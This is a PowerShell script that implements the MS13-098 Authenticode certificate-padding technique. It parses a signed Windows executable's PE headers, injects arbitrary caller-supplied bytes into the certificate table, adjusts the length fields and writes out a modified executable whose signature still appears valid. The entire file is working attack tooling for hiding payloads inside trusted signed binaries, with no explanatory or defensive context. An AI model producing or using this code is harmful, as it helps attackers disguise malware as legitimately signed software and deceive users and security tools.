function Invoke-MS13_098 {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateScript({
                if (-not ($_ | Test-Path)) {
                    throw "Path does not exist"
                }
                if (-not ($_ | Test-Path -PathType Leaf)) {
                    throw "Path should point to a file"
                }
                return $true
            })]
        [System.IO.FileInfo]
        $TargetExecutable,

        [Parameter(Mandatory = $True)]
        [byte[]]
        $DataToInsert
    )
    begin {
        Write-Verbose "Begin $($MyInvocation.MyCommand)"
        $ErrorActionPreference = "Stop"

        # PInvoke necessary Win32 APIs
        Add-Type -MemberDefinition @"
[StructLayout(LayoutKind.Sequential)]
public struct IMAGE_DOS_HEADER {
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
    public char[] e_magic;    // Magic number
    public UInt16 e_cblp;     // Bytes on last page of file
    public UInt16 e_cp;       // Pages in file
    public UInt16 e_crlc;     // Relocations
    public UInt16 e_cparhdr;  // Size of header in paragraphs
    public UInt16 e_minalloc; // Minimum extra paragraphs needed
    public UInt16 e_maxalloc; // Maximum extra paragraphs needed
    public UInt16 e_ss;       // Initial (relative) SS value
    public UInt16 e_sp;       // Initial SP value
    public UInt16 e_csum;     // Checksum
    public UInt16 e_ip;       // Initial IP value
    public UInt16 e_cs;       // Initial (relative) CS value
    public UInt16 e_lfarlc;   // File address of relocation table
    public UInt16 e_ovno;     // Overlay number
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
    public UInt16[] e_res1;   // Reserved words
    public UInt16 e_oemid;    // OEM identifier (for e_oeminfo)
    public UInt16 e_oeminfo;  // OEM information; e_oemid specific
    [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
    public UInt16[] e_res2;   // Reserved words
    public Int32 e_lfanew;    // File address of new exe header
    private string _e_magic {
        get {
            return new string(e_magic);
        }
    }
    public bool isValid {
        get {
            return _e_magic == "MZ";
        }
    }
}
[StructLayout(LayoutKind.Explicit)]
public struct IMAGE_NT_HEADERS32 {
    [FieldOffset(0)]
    public UInt32 Signature;
    [FieldOffset(4)]
    public IMAGE_FILE_HEADER FileHeader;
    [FieldOffset(24)]
    public IMAGE_OPTIONAL_HEADER32 OptionalHeader;
    private string _Signature {
        get {
            return Signature.ToString();
        }
    }
    public bool isValid {
        get {
            return _Signature == "PE\0\0" && OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR32_MAGIC;
        }
    }
}
[StructLayout(LayoutKind.Explicit)]
public struct IMAGE_NT_HEADERS64 {
    [FieldOffset(0)]
    public UInt32 Signature;
    [FieldOffset(4)]
    public IMAGE_FILE_HEADER FileHeader;
    [FieldOffset(24)]
    public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    private string _Signature {
        get {
            return Signature.ToString();
        }
    }
    public bool isValid {
        get {
            return _Signature == "PE\0\0" && OptionalHeader.Magic == MagicType.IMAGE_NT_OPTIONAL_HDR64_MAGIC;
        }
    }
}
[StructLayout(LayoutKind.Sequential)]
public struct IMAGE_FILE_HEADER {
    public UInt16 Machine;
    public UInt16 NumberOfSections;
    public UInt32 TimeDateStamp;
    public UInt32 PointerToSymbolTable;
    public UInt32 NumberOfSymbols;
    public UInt16 SizeOfOptionalHeader;
    public UInt16 Characteristics;
}
public enum MachineType : ushort {
    Unknown = 0x0000,
    I386 = 0x014c,
    R3000 = 0x0162,
    R4000 = 0x0166,
    R10000 = 0x0168,
    WCEMIPSV2 = 0x0169,
    Alpha = 0x0184,
    SH3 = 0x01a2,
    SH3DSP = 0x01a3,
    SH4 = 0x01a6,
    SH5 = 0x01a8,
    ARM = 0x01c0,
    Thumb = 0x01c2,
    ARMNT = 0x01c4,
    AM33 = 0x01d3,
    PowerPC = 0x01f0,
    PowerPCFP = 0x01f1,
    IA64 = 0x0200,
    MIPS16 = 0x0266,
    M68K = 0x0268,
    Alpha64 = 0x0284,
    MIPSFPU = 0x0366,
    MIPSFPU16 = 0x0466,
    EBC = 0x0ebc,
    RISCV32 = 0x5032,
    RISCV64 = 0x5064,
    RISCV128 = 0x5128,
    AMD64 = 0x8664,
    ARM64 = 0xaa64,
    LoongArch32 = 0x6232,
    LoongArch64 = 0x6264,
    M32R = 0x9041
}
public enum MagicType : ushort {
    IMAGE_NT_OPTIONAL_HDR32_MAGIC = 0x10b,
    IMAGE_NT_OPTIONAL_HDR64_MAGIC = 0x20b
}
public enum SubSystemType : ushort {
    IMAGE_SUBSYSTEM_UNKNOWN = 0,
    IMAGE_SUBSYSTEM_NATIVE = 1,
    IMAGE_SUBSYSTEM_WINDOWS_GUI = 2,
    IMAGE_SUBSYSTEM_WINDOWS_CUI = 3,
    IMAGE_SUBSYSTEM_POSIX_CUI = 7,
    IMAGE_SUBSYSTEM_WINDOWS_CE_GUI = 9,
    IMAGE_SUBSYSTEM_EFI_APPLICATION = 10,
    IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER = 11,
    IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER = 12,
    IMAGE_SUBSYSTEM_EFI_ROM = 13,
    IMAGE_SUBSYSTEM_XBOX = 14
}
public enum DllCharacteristicsType : ushort {
    RES_0 = 0x0001,
    RES_1 = 0x0002,
    RES_2 = 0x0004,
    RES_3 = 0x0008,
    IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE = 0x0040,
    IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY = 0x0080,
    IMAGE_DLL_CHARACTERISTICS_NX_COMPAT = 0x0100,
    IMAGE_DLLCHARACTERISTICS_NO_ISOLATION = 0x0200,
    IMAGE_DLLCHARACTERISTICS_NO_SEH = 0x0400,
    IMAGE_DLLCHARACTERISTICS_NO_BIND = 0x0800,
    RES_4 = 0x1000,
    IMAGE_DLLCHARACTERISTICS_WDM_DRIVER = 0x2000,
    IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE = 0x8000
}
public enum DataSectionFlags : uint {
    TypeReg = 0x00000000,
    TypeDsect = 0x00000001,
    TypeNoLoad = 0x00000002,
    TypeGroup = 0x00000004,
    TypeNoPadded = 0x00000008,
    TypeCopy = 0x00000010,
    ContentCode = 0x00000020,
    ContentInitializedData = 0x00000040,
    ContentUninitializedData = 0x00000080,
    LinkOther = 0x00000100,
    LinkInfo = 0x00000200,
    TypeOver = 0x00000400,
    LinkRemove = 0x00000800,
    LinkComDat = 0x00001000,
    NoDeferSpecExceptions = 0x00004000,
    RelativeGP = 0x00008000,
    MemPurgeable = 0x00020000,
    Memory16Bit = 0x00020000,
    MemoryLocked = 0x00040000,
    MemoryPreload = 0x00080000,
    Align1Bytes = 0x00100000,
    Align2Bytes = 0x00200000,
    Align4Bytes = 0x00300000,
    Align8Bytes = 0x00400000,
    Align16Bytes = 0x00500000,
    Align32Bytes = 0x00600000,
    Align64Bytes = 0x00700000,
    Align128Bytes = 0x00800000,
    Align256Bytes = 0x00900000,
    Align512Bytes = 0x00A00000,
    Align1024Bytes = 0x00B00000,
    Align2048Bytes = 0x00C00000,
    Align4096Bytes = 0x00D00000,
    Align8192Bytes = 0x00E00000,
    LinkExtendedRelocationOverflow = 0x01000000,
    MemoryDiscardable = 0x02000000,
    MemoryNotCached = 0x04000000,
    MemoryNotPaged = 0x08000000,
    MemoryShared = 0x10000000,
    MemoryExecute = 0x20000000,
    MemoryRead = 0x40000000,
    MemoryWrite = 0x80000000
}
[StructLayout(LayoutKind.Explicit)]
public struct IMAGE_OPTIONAL_HEADER32 {
    [FieldOffset(0)]
    public MagicType Magic;
    [FieldOffset(2)]
    public byte MajorLinkerVersion;
    [FieldOffset(3)]
    public byte MinorLinkerVersion;
    [FieldOffset(4)]
    public uint SizeOfCode;
    [FieldOffset(8)]
    public uint SizeOfInitializedData;
    [FieldOffset(12)]
    public uint SizeOfUninitializedData;
    [FieldOffset(16)]
    public uint AddressOfEntryPoint;
    [FieldOffset(20)]
    public uint BaseOfCode;
    // PE32 contains this additional field
    [FieldOffset(24)]
    public uint BaseOfData;
    [FieldOffset(28)]
    public uint ImageBase;
    [FieldOffset(32)]
    public uint SectionAlignment;
    [FieldOffset(36)]
    public uint FileAlignment;
    [FieldOffset(40)]
    public ushort MajorOperatingSystemVersion;
    [FieldOffset(42)]
    public ushort MinorOperatingSystemVersion;
    [FieldOffset(44)]
    public ushort MajorImageVersion;
    [FieldOffset(46)]
    public ushort MinorImageVersion;
    [FieldOffset(48)]
    public ushort MajorSubsystemVersion;
    [FieldOffset(50)]
    public ushort MinorSubsystemVersion;
    [FieldOffset(52)]
    public uint Win32VersionValue;
    [FieldOffset(56)]
    public uint SizeOfImage;
    [FieldOffset(60)]
    public uint SizeOfHeaders;
    [FieldOffset(64)]
    public uint CheckSum;
    [FieldOffset(68)]
    public SubSystemType Subsystem;
    [FieldOffset(70)]
    public DllCharacteristicsType DllCharacteristics;
    [FieldOffset(72)]
    public uint SizeOfStackReserve;
    [FieldOffset(76)]
    public uint SizeOfStackCommit;
    [FieldOffset(80)]
    public uint SizeOfHeapReserve;
    [FieldOffset(84)]
    public uint SizeOfHeapCommit;
    [FieldOffset(88)]
    public uint LoaderFlags;
    [FieldOffset(92)]
    public uint NumberOfRvaAndSizes;
    [FieldOffset(96)]
    public IMAGE_DATA_DIRECTORY ExportTable;
    [FieldOffset(104)]
    public IMAGE_DATA_DIRECTORY ImportTable;
    [FieldOffset(112)]
    public IMAGE_DATA_DIRECTORY ResourceTable;
    [FieldOffset(120)]
    public IMAGE_DATA_DIRECTORY ExceptionTable;
    [FieldOffset(128)]
    public IMAGE_DATA_DIRECTORY CertificateTable;
    [FieldOffset(136)]
    public IMAGE_DATA_DIRECTORY BaseRelocationTable;
    [FieldOffset(144)]
    public IMAGE_DATA_DIRECTORY Debug;
    [FieldOffset(152)]
    public IMAGE_DATA_DIRECTORY Architecture;
    [FieldOffset(160)]
    public IMAGE_DATA_DIRECTORY GlobalPtr;
    [FieldOffset(168)]
    public IMAGE_DATA_DIRECTORY TLSTable;
    [FieldOffset(176)]
    public IMAGE_DATA_DIRECTORY LoadConfigTable;
    [FieldOffset(184)]
    public IMAGE_DATA_DIRECTORY BoundImport;
    [FieldOffset(192)]
    public IMAGE_DATA_DIRECTORY IAT;
    [FieldOffset(200)]
    public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
    [FieldOffset(208)]
    public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
    [FieldOffset(216)]
    public IMAGE_DATA_DIRECTORY Reserved;
}
[StructLayout(LayoutKind.Explicit)]
public struct IMAGE_OPTIONAL_HEADER64 {
    [FieldOffset(0)]
    public MagicType Magic;
    [FieldOffset(2)]
    public byte MajorLinkerVersion;
    [FieldOffset(3)]
    public byte MinorLinkerVersion;
    [FieldOffset(4)]
    public uint SizeOfCode;
    [FieldOffset(8)]
    public uint SizeOfInitializedData;
    [FieldOffset(12)]
    public uint SizeOfUninitializedData;
    [FieldOffset(16)]
    public uint AddressOfEntryPoint;
    [FieldOffset(20)]
    public uint BaseOfCode;
    [FieldOffset(24)]
    public ulong ImageBase;
    [FieldOffset(32)]
    public uint SectionAlignment;
    [FieldOffset(36)]
    public uint FileAlignment;
    [FieldOffset(40)]
    public ushort MajorOperatingSystemVersion;
    [FieldOffset(42)]
    public ushort MinorOperatingSystemVersion;
    [FieldOffset(44)]
    public ushort MajorImageVersion;
    [FieldOffset(46)]
    public ushort MinorImageVersion;
    [FieldOffset(48)]
    public ushort MajorSubsystemVersion;
    [FieldOffset(50)]
    public ushort MinorSubsystemVersion;
    [FieldOffset(52)]
    public uint Win32VersionValue;
    [FieldOffset(56)]
    public uint SizeOfImage;
    [FieldOffset(60)]
    public uint SizeOfHeaders;
    [FieldOffset(64)]
    public uint CheckSum;
    [FieldOffset(68)]
    public SubSystemType Subsystem;
    [FieldOffset(70)]
    public DllCharacteristicsType DllCharacteristics;
    [FieldOffset(72)]
    public ulong SizeOfStackReserve;
    [FieldOffset(80)]
    public ulong SizeOfStackCommit;
    [FieldOffset(88)]
    public ulong SizeOfHeapReserve;
    [FieldOffset(96)]
    public ulong SizeOfHeapCommit;
    [FieldOffset(104)]
    public uint LoaderFlags;
    [FieldOffset(108)]
    public uint NumberOfRvaAndSizes;
    [FieldOffset(112)]
    public IMAGE_DATA_DIRECTORY ExportTable;
    [FieldOffset(120)]
    public IMAGE_DATA_DIRECTORY ImportTable;
    [FieldOffset(128)]
    public IMAGE_DATA_DIRECTORY ResourceTable;
    [FieldOffset(136)]
    public IMAGE_DATA_DIRECTORY ExceptionTable;
    [FieldOffset(144)]
    public IMAGE_DATA_DIRECTORY CertificateTable;
    [FieldOffset(152)]
    public IMAGE_DATA_DIRECTORY BaseRelocationTable;
    [FieldOffset(160)]
    public IMAGE_DATA_DIRECTORY Debug;
    [FieldOffset(168)]
    public IMAGE_DATA_DIRECTORY Architecture;
    [FieldOffset(176)]
    public IMAGE_DATA_DIRECTORY GlobalPtr;
    [FieldOffset(184)]
    public IMAGE_DATA_DIRECTORY TLSTable;
    [FieldOffset(192)]
    public IMAGE_DATA_DIRECTORY LoadConfigTable;
    [FieldOffset(200)]
    public IMAGE_DATA_DIRECTORY BoundImport;
    [FieldOffset(208)]
    public IMAGE_DATA_DIRECTORY IAT;
    [FieldOffset(216)]
    public IMAGE_DATA_DIRECTORY DelayImportDescriptor;
    [FieldOffset(224)]
    public IMAGE_DATA_DIRECTORY CLRRuntimeHeader;
    [FieldOffset(232)]
    public IMAGE_DATA_DIRECTORY Reserved;
}
[StructLayout(LayoutKind.Sequential)]
public struct IMAGE_DATA_DIRECTORY {
    public UInt32 VirtualAddress;
    public UInt32 Size;
}
[StructLayout(LayoutKind.Sequential)]
public struct IMAGE_EXPORT_DIRECTORY {
    public UInt32 Characteristics;
    public UInt32 TimeDateStamp;
    public UInt16 MajorVersion;
    public UInt16 MinorVersion;
    public UInt32 Name;
    public UInt32 Base;
    public UInt32 NumberOfFunctions;
    public UInt32 NumberOfNames;
    public UInt32 AddressOfFunctions;    // RVA from base of image
    public UInt32 AddressOfNames;        // RVA from base of image
    public UInt32 AddressOfNameOrdinals; // RVA from base of image
}
[StructLayout(LayoutKind.Sequential)]
public struct IMAGE_SECTION_HEADER {
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 8)]
    public string Name;
    public UInt32 VirtualSize;
    public UInt32 VirtualAddress;
    public UInt32 SizeOfRawData;
    public UInt32 PointerToRawData;
    public UInt32 PointerToRelocations;
    public UInt32 PointerToLinenumbers;
    public UInt16 NumberOfRelocations;
    public UInt16 NumberOfLinenumbers;
    public DataSectionFlags Characteristics;
}

public enum WIN_CERT_REVISION : ushort {
    REVISION_1_0 = 0x0100,
    REVISION_2_0 = 0x0200,
}

public enum WIN_CERT_TYPE : ushort {
    X509 = 1,
    PKCS_SIGNED_DATA = 2,
    RESERVED_1 = 3,
    TS_STACK_SIGNED = 4,
    PKCS1_SIGN = 9,
}

[StructLayout(LayoutKind.Sequential)]
public struct WIN_CERTIFICATE {
    public uint dwLength;
    public WIN_CERT_REVISION wRevision;
    public WIN_CERT_TYPE wCertificateType;
    //public Byte bCertificate; -- variable sized array, so Marshal.Copy based on dwLength
}
"@ -Name "Kernel32" -Namespace "Win32" -PassThru | Out-Null
    }
    process {
        # Read all bytes from the target executable file
        $FileBytes = [IO.File]::ReadAllBytes($TargetExecutable.FullName)

        # Allocate memory and copy FileBytes into the buffer
        $AddressOfFile = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FileBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($FileBytes, 0, $AddressOfFile, $FileBytes.Length)

        # Get the DOS and NT headers of the file
        $DOSHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($AddressOfFile, [type][Win32.Kernel32+IMAGE_DOS_HEADER])
        $AddressOfNTHeaders = [System.IntPtr]::Add($AddressOfFile, $DOSHeader.e_lfanew)
        $NTHeaders = [System.Runtime.InteropServices.Marshal]::PtrToStructure($AddressOfNTHeaders, [type][Win32.Kernel32+IMAGE_NT_HEADERS64])
        
        # Check if the file has a certificate table address for us to append data to
        if ($NTHeaders.OptionalHeader.CertificateTable.VirtualAddress -eq 0) {
            Write-Warning "$TargetExecutable does not have a certificate table address."
            return
        }

        # Get the address of the certificate table and actual certificate [+8]
        $AddressOfCertificateTable = [System.IntPtr]::Add($AddressOfFile, $NTHeaders.OptionalHeader.CertificateTable.VirtualAddress)
        $AddressOfCertificate = [System.IntPtr]::Add($AddressOfCertificateTable, [System.Runtime.InteropServices.Marshal]::SizeOf([type][Win32.Kernel32+WIN_CERTIFICATE]))
        
        # Get the certificate table
        $CertificateTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($AddressOfCertificateTable, [type][Win32.Kernel32+WIN_CERTIFICATE])

        # Track original certificate size
        $OriginalCertificateSize = $CertificateTable.dwLength - [System.Runtime.InteropServices.Marshal]::SizeOf($CertificateTable)

        # Convert pointer to certificate into an array of bytes
        $CertificateBytes = [byte[]]::new($OriginalCertificateSize)
        [System.Runtime.InteropServices.Marshal]::Copy($AddressOfCertificate, $CertificateBytes, 0, $OriginalCertificateSize)
        
        <# 
        #  The Authenticode certificate is typically appended to the end of the PE file to allow storing signature and certificate information
        #  separately from the rest of the files data. However, it's technically possible to place the certificate in other locations within the
        #  file or to store it in a separate file altogether. To err on the side of caution, assume the certificate doesn't exist at the EOF.
        #>
        foreach ($b in (($FileBytes.Length - $CertificateBytes.Length)..0)) {
            if ($FileBytes[$b] -eq $CertificateBytes[0]) {
                $IsMatch = $True
                $Chunk = $FileBytes[$b..($b + $CertificateBytes.Length - 1)]
                foreach ($c in (0..($Chunk.Length))) {
                    if ($Chunk[$c] -ne $CertificateBytes[$c]) {
                        $IsMatch = $False
                        break
                    }
                }
                if ($IsMatch) {
                    break
                }
            }
        }

        # START and END index of certificate
        $StartIndex = $b
        $EndIndex = $b + $OriginalCertificateSize

        # Concatenate the new data to insert with the certificate bytes
        $NewCertBytes = $CertificateBytes + $DataToInsert
        # The WHOLE certificate table (+8) needs to be aligned to 16 bytes
        $NewCertBytes += [byte[]]::new(8 - ($NewCertBytes.Length % 8))

        # Update the buffer of the IMAGE_CERTIFICATE_ENTRY structure with the new length of the certificate table
        $CertificateTable.dwLength = [System.Runtime.InteropServices.Marshal]::SizeOf($CertificateTable) + $NewCertBytes.Length
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CertificateTable, $AddressOfCertificateTable, $false) # Update buffer with dwLength
        
        # Update the IMAGE_OPTIONAL_HEADER and IMAGE_DATA_DIRECTORY with the new size of the certificate table (can't set directly?)
        $OptionalHeader = $NTHeaders.OptionalHeader
        $CertificateDataDirectory = $OptionalHeader.CertificateTable
        $CertificateDataDirectory.Size += $NewCertBytes.Length - $CertificateBytes.Length
        $OptionalHeader.CertificateTable = $CertificateDataDirectory
        $NTHeaders.OptionalHeader = $OptionalHeader
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($NTHeaders, $AddressOfNTHeaders, $false)

        # Copy the contents of the new file to a new array of bytes
        $NewFileBytes = [Byte[]]::new($FileBytes.Length)
        [System.Runtime.InteropServices.Marshal]::Copy($AddressOfFile, $NewFileBytes, 0, $FileBytes.Length)

        # Construct our actual final file (2nd half is likely empty)
        $FirstHalf = $NewFileBytes[0..($StartIndex - 1)]
        $SecondHalf = $NewFileBytes[$EndIndex..($NewFileBytes.Length)]
        $FinalFileBytes = $FirstHalf + $NewCertBytes + $SecondHalf

        # Write new file
        [IO.File]::WriteAllBytes("$($TargetExecutable.Directory)\$($TargetExecutable.BaseName)-New.exe", $FinalFileBytes)
    }
    end {
        Write-Verbose "End $($MyInvocation.MyCommand)"       
    }
}